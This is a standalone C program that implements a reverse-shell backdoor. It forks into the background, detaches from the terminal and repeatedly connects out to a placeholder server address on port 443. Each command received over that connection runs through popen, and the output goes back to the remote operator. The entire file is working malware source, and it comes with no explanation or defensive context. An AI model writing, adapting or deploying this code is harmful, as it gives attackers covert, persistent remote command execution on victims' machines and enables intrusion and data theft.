#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>




#define PORT		     	     443
#define IP  		 	<SERVER_IP>




int main(){




        int                     s_sock,fd ;
        int                     nbytes, recv_length, one=1;
        struct  sockaddr_in     s_addr ;
        socklen_t               sin_size;
        char                    cmd[1024];
        char                    cmd_output[1024];
        FILE *                  pipe_fin;
        int                     first = 0 ;



        switch(fork()){

                case -1:
                                exit(-1);

		case 0 :

                        close(0);
                        close(1);
                        close(2);

                        setsid();
                        chdir("/");

                        s_addr.sin_family       = AF_INET;
                        s_addr.sin_port         = htons(PORT);
                        s_addr.sin_addr.s_addr  = inet_addr(IP);

                        memset(&(s_addr.sin_zero),'\0',8);

                while(1){

                        memset(cmd ,'\0', sizeof(cmd));
                        memset(cmd_output, '\0', sizeof(cmd_output));

                        if(first!=0)
              sleep(5000);

                        else
                                first=1;

                        if((s_sock = socket(PF_INET, SOCK_STREAM, 0))==-1)       
                                exit(EXIT_FAILURE);

                        while(connect(s_sock, (struct sockaddr *)&s_addr, sizeof(s_addr))==-1)
                                ;

                        send(s_sock, ">>",2,0);
                        recv_length = recv(s_sock, &cmd, sizeof(cmd)-6, 0);


                        while(recv_length>0){

                                cmd[recv_length-1]='\0';
                                if(strcmp(cmd, "quit")==0){
                                        close(s_sock);
                                        break;
					             }
                                pipe_fin = popen(strcat(cmd," 2>&1"), "r");

                                while((nbytes = read(fileno(pipe_fin), &cmd_output, sizeof(cmd_output)-1))!=-1){

                                        if(nbytes>0){
                                                cmd_output[nbytes]='\0';
                                                send(s_sock, &cmd_output, nbytes, 0);
                                        }

                                        else
                                                break;

                                        }

                                        send(s_sock, ">>", 2, 0);
                                        recv_length = recv(s_sock, &cmd, sizeof(cmd), 0);
                                        cmd[recv_length] = '\0';
                                        memset(cmd_output, '\0', sizeof(cmd_output));


                                        fclose(pipe_fin);


                                }


                        }


                default:
                                exit(0);


        }



}
